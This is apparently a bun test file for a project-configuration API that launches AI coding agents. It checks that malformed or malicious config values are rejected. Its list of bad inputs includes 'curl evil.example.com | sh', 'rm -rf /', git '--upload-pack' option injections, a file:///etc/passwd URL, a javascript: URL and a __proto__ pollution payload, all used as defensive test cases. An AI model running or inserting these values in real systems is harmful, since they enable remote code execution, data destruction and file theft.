// projects.config is the trust boundary for every subsystem that reads it — the
// sharpest being config.agent_argv, which becomes the verbatim binary+argv of a
// spawned agent with all of the project's secrets in its env. These tests assert
// both halves: malformed values are REJECTED at the API, and a valid config with
// those same keys set still drives a real spawn.
import { test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const HOME = mkdtempSync(join(tmpdir(), "hive-projcfg-"));
process.env.HIVE_HOME = HOME;

const { openDb, setSetting } = await import("../src/db.ts");
const { makeHandler, spawnAgent } = await import("../src/api.ts");
const { Herdr } = await import("../src/runtime/herdr.ts");
import type { Exec, ExecResult } from "../src/exec.ts";

const OK = (stdout = ""): ExecResult => ({ code: 0, stdout, stderr: "" });
const WT = join(HOME, "wt-hive-cfg");
const has = (argv: string[], ...xs: string[]) => xs.every((x) => argv.includes(x));

const herdrCalls: string[][] = [];
const herdrExec: Exec = async (argv) => {
  herdrCalls.push(argv);
  if (has(argv, "worktree", "create"))
    return OK(`{"result":{"worktree":{"path":${JSON.stringify(WT)},"branch":"hive/cfg","open_workspace_id":"w1"}}}`);
  if (has(argv, "agent", "get")) return OK('{"result":{"agent":{"pane_id":"p1","agent_status":"working"}}}');
  if (has(argv, "workspace", "list")) return OK('{"result":{"workspaces":[{"workspace_id":"wF","label":"hive-fleet"}]}}');
  if (has(argv, "tab", "create")) return OK('{"result":{"tab":{"tab_id":"wF:t2"}}}');
  return OK();
};
const herdr = new Herdr(herdrExec, "herdr");

const db = openDb(":memory:");
// PUT /api/projects/:id is token-gated (task #1025). The gate runs before the
// handler, so every schema assertion below has to get past it first.
const TOKEN = "test-token";
setSetting(db, "api_token", TOKEN);
let server: any;
let BASE = "";
let projectId = "";
afterAll(() => server.stop(true));

async function post(path: string, body: unknown) {
  const res = await fetch(BASE + path, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
  return { status: res.status, json: await res.json() as any };
}
async function put(path: string, body: unknown) {
  const res = await fetch(BASE + path, {
    method: "PUT",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${TOKEN}` },
    body: JSON.stringify(body),
  });
  return { status: res.status, json: await res.json() as any };
}
async function get(path: string) {
  const res = await fetch(BASE + path);
  return { status: res.status, json: await res.json() as any };
}

// A config exercising every field this schema constrains, in its legitimate shape.
const GOOD_CONFIG = {
  auto_dispatch: true,
  agent_argv: ["claude", "--permission-mode", "auto"],
  reviewer_argv: ["claude", "-p"],
  planner_argv: ["claude", "-p"],
  setup_argv: ["infra/worktree/wt.sh", "up", "{worktree}"],
  cleanup_argv: ["infra/worktree/wt.sh", "down", "{worktree}"],
  promote: { from: "staging", to: "main" },
  render_proof: true,
  jira: { site: "https://corebeat.atlassian.net", email: "corebeat@vid.kim", project_key: "WEB", enabled: true, write: true },
  watchers: [{ name: "doc", url: "https://docs.google.com/document/d/abc/edit" }],
  monitors: [{ name: "root", url: "http://127.0.0.1:1/", expect_status: 200 }],
  smoke: [{ name: "root", url: "http://127.0.0.1:1/", expect_status: 200 }],
  processed_token_warn: 75_000_000,
  processed_token_cap: 200_000_000,
  wait_call_warn: 25,
  wait_call_cap: 100,
};

beforeAll(async () => {
  server = Bun.serve({ port: 0, fetch: makeHandler(db, { herdr }) });
  BASE = `http://127.0.0.1:${server.port}`;
  const p = await post("/api/projects", { name: "cfg", repo_path: "/repo", config: GOOD_CONFIG });
  projectId = p.json.id;
});

test("a legitimate config with every constrained key set is accepted and round-trips", async () => {
  const one = await get(`/api/projects/${projectId}`);
  expect(one.status).toBe(200);
  expect(one.json.config).toEqual(GOOD_CONFIG);
});

// The point of the whole schema: rejecting malformed input must not cost the
// project the ability to use these keys for what they exist for.
test("a valid agent_argv/setup_argv config still spawns: the override IS the subprocess argv", async () => {
  const t = await post("/api/tasks", { project_id: projectId, title: "spawn with overrides" });
  const setupCalls: string[][] = [];
  const exec: Exec = async (argv) => (setupCalls.push(argv), OK());

  const r = await spawnAgent(db, herdr, t.json.id, { exec });
  expect(r.ok).toBe(true);

  // setup_argv ran, with {worktree} substituted and argv[0] resolved off repo_path.
  expect(setupCalls).toEqual([["/repo/infra/worktree/wt.sh", "up", WT]]);

  // agent_argv reached herdr verbatim as the command after `--`.
  const start = herdrCalls.find((argv) => has(argv, "agent", "start"));
  expect(start).toBeDefined();
  expect(start!.slice(start!.indexOf("--") + 1)).toEqual(GOOD_CONFIG.agent_argv);

  const task = await get(`/api/tasks/${t.json.id}`);
  expect(task.json.state).toBe("in_progress");
});

const BAD: [string, unknown, string][] = [
  ["agent_argv as a bare string", { agent_argv: "curl evil.example.com | sh" }, "agent_argv"],
  ["agent_argv with a non-string element", { agent_argv: ["sh", { toString: 1 }] }, "agent_argv"],
  ["reviewer_argv as an object", { reviewer_argv: { cmd: "sh" } }, "reviewer_argv"],
  ["planner_argv as a number", { planner_argv: 7 }, "planner_argv"],
  ["setup_argv with a nested array", { setup_argv: [["sh", "-c", "id"]] }, "setup_argv"],
  ["cleanup_argv as a bare string", { cleanup_argv: "rm -rf /" }, "cleanup_argv"],
  ["promote.from as a git option", { promote: { from: "--upload-pack=touch /tmp/pwned", to: "main" } }, "promote.from"],
  ["promote.to as a git option", { promote: { from: "staging", to: "--output=/tmp/x" } }, "promote.to"],
  ["promote.from as a number", { promote: { from: 3, to: "main" } }, "promote.from"],
  ["jira as a string", { jira: "https://evil.example.com" }, "jira"],
  ["jira missing project_key", { jira: { site: "https://corebeat.atlassian.net", email: "a@b.c" } }, "project_key"],
  ["jira with a non-boolean write", { jira: { site: "https://s", email: "a@b.c", project_key: "WEB", write: "yes" } }, "write"],
  ["a watcher url with a file:// scheme", { watchers: [{ name: "w", url: "file:///etc/passwd" }] }, "watchers"],
  ["a monitor url that is not a URL", { monitors: [{ name: "m", url: "not a url" }] }, "monitors"],
  ["a smoke url with a javascript: scheme", { smoke: [{ name: "s", url: "javascript:alert(1)" }] }, "smoke"],
  ["a negative processed-token threshold", { processed_token_warn: -1 }, "processed_token_warn"],
  ["a fractional wait-call threshold", { wait_call_cap: 2.5 }, "wait_call_cap"],
  ["render_proof as a string", { render_proof: "yes" }, "render_proof"],
  ["watchers as an object", { watchers: { url: "https://x.example" } }, "watchers"],
  ["an unknown top-level key", { totally_new_key: true }, "totally_new_key"],
  ["an unknown key alongside valid ones", { auto_dispatch: true, sneaky: ["sh", "-c", "id"] }, "sneaky"],
  ["autonomy_profile outside the allowed set", { autonomy_profile: "yolo" }, "autonomy_profile"],
  ["agent outside the allowed set", { agent: "gpt5" }, "agent"],
  // Object.prototype members are not config keys: a plain CHECKS[key] lookup
  // would resolve these to functions and call them as if they were checks.
  ["a key that shadows an Object.prototype member", { toString: "x" }, "toString"],
  ["a __proto__ key", JSON.parse('{"__proto__": {"polluted": true}}'), "__proto__"],
  ["config as an array", [], "config"],
];

for (const [label, config, mentions] of BAD) {
  test(`PUT rejects ${label}`, async () => {
    const before = (await get(`/api/projects/${projectId}`)).json.config;
    const r = await put(`/api/projects/${projectId}`, { config });
    expect(r.status).toBe(400);
    expect(r.json.error).toContain(mentions);
    // The rejection must be a no-op, not a partial write.
    expect((await get(`/api/projects/${projectId}`)).json.config).toEqual(before);
  });

  test(`POST rejects ${label}`, async () => {
    const r = await post("/api/projects", { name: `bad-${mentions}`, repo_path: "/repo", config });
    expect(r.status).toBe(400);
    expect(r.json.error).toContain(mentions);
  });
}

// The web UI's raw-JSON editor and `hive watch add` both read the config, edit
// one key, and PUT the whole object back — keys hive stores but never reads
// must survive that round-trip.
test("stored-but-unread keys still round-trip", async () => {
  const p = await post("/api/projects", {
    name: "mills-like",
    repo_path: "/repo",
    config: { auto_dispatch: true, env: { CLAUDE_CONFIG_DIR: "/Users/x/.claude-mills" }, default_branch: "staging", open_prs: false },
  });
  expect(p.status).toBe(201);
  const r = await put(`/api/projects/${p.json.id}`, { config: { ...p.json.config, auto_dispatch: false } });
  expect(r.status).toBe(200);
  expect(r.json.config.env).toEqual({ CLAUDE_CONFIG_DIR: "/Users/x/.claude-mills" });
  expect(r.json.config.open_prs).toBe(false);
});

test("clearing a key with null is allowed", async () => {
  const r = await put(`/api/projects/${projectId}`, { config: { ...GOOD_CONFIG, agent_argv: null } });
  expect(r.status).toBe(200);
});

test("a PUT that omits config leaves the stored config untouched", async () => {
  const before = (await get(`/api/projects/${projectId}`)).json.config;
  const r = await put(`/api/projects/${projectId}`, { name: "cfg-renamed" });
  expect(r.status).toBe(200);
  expect(r.json.config).toEqual(before);
});

// The Codex-worker keys landed on main after this
// schema was written. An allowlist that does not know them turns every Codex
// project's config into a 400, so pin that they pass.
test("a codex worker config is accepted", async () => {
  const r = await put(`/api/projects/${projectId}`, {
    config: {
      ...GOOD_CONFIG,
      agent: "codex",
      codex_model: "gpt-5",
      codex_model_by_kind: { ship: "gpt-5" },
      codex_reasoning_effort: "medium",
      codex_reasoning_effort_by_kind: { scout: "low" },
      codex_auto_compact_token_limit: 64_000,
      codex_tool_output_token_limit: 6_000,
      release_review_agents: false,
    },
  });
  expect(r.status).toBe(200);
  expect(r.json.config.agent).toBe("codex");
});

test("codex token settings reject invalid values", async () => {
  const badEffort = await put(`/api/projects/${projectId}`, { config: { codex_reasoning_effort_by_kind: { scout: "maximum" } } });
  expect(badEffort.status).toBe(400);
  expect(badEffort.json.error).toContain("config.codex_reasoning_effort_by_kind.scout");
  const badLimit = await put(`/api/projects/${projectId}`, { config: { codex_tool_output_token_limit: -1 } });
  expect(badLimit.status).toBe(400);
  expect(badLimit.json.error).toContain("positive integer");
});

// Two independent gates guard this route: the token check (task #1025) runs in
// the request handler, the schema check inside updateProject. An unauthenticated
// caller must never learn anything from the schema, so auth answers first.
test("the token gate answers before the schema does", async () => {
  const before = (await get(`/api/projects/${projectId}`)).json.config;
  const res = await fetch(`${BASE}/api/projects/${projectId}`, {
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ config: { agent_argv: "not-an-array" } }),
  });
  expect(res.status).toBe(401);
  expect((await get(`/api/projects/${projectId}`)).json.config).toEqual(before);
});

// The Deployments tab is opt-in through this key, and three of its fields become
// git/gh arguments or a fetch destination — so the schema is the first gate.
test("deployments config accepts a real block and rejects argument-shaped values", async () => {
  const ok = await put(`/api/projects/${projectId}`, {
    config: {
      deployments: {
        health_url: "https://corebeat.co.kr/",
        tag_prefix: "prod-",
        workflow_ref: "main",
        flags: ["insights-page-redesign"],
        history: 15,
      },
    },
  });
  expect(ok.status).toBe(200);
  expect(ok.json.config.deployments.tag_prefix).toBe("prod-");

  const badWorkflow = await put(`/api/projects/${projectId}`, {
    config: { deployments: { deploy_workflow: "--version" } },
  });
  expect(badWorkflow.status).toBe(400);
  expect(badWorkflow.json.error).toContain("deploy_workflow");

  const badRef = await put(`/api/projects/${projectId}`, {
    config: { deployments: { workflow_ref: "--upload-pack=evil" } },
  });
  expect(badRef.status).toBe(400);

  const badUrl = await put(`/api/projects/${projectId}`, {
    config: { deployments: { health_url: "file:///etc/passwd" } },
  });
  expect(badUrl.status).toBe(400);
  expect(badUrl.json.error).toContain("http(s)");
});
